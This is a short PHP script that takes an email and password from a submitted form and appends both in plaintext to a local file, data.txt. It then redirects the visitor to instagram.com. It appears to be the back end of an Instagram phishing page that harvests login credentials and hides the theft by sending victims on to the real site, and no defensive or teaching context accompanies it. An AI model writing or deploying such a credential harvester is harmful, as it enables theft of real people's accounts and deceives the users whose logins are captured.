<?php
// Data file path
$file = 'data.txt';

// Get the email and password from the form and sanitize them
$email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
$password = htmlspecialchars($_POST['password']);

// Validate email
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo "Invalid email format";
    exit;
}

// Prepare the data to save
$data = "Email: $email, Password: $password\n";

// Save the data to the file
if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX) === false) {
    echo "Failed to save data.";
    exit;
}

// Redirect to Instagram
header("Location: https://www.instagram.com");
exit;
?>
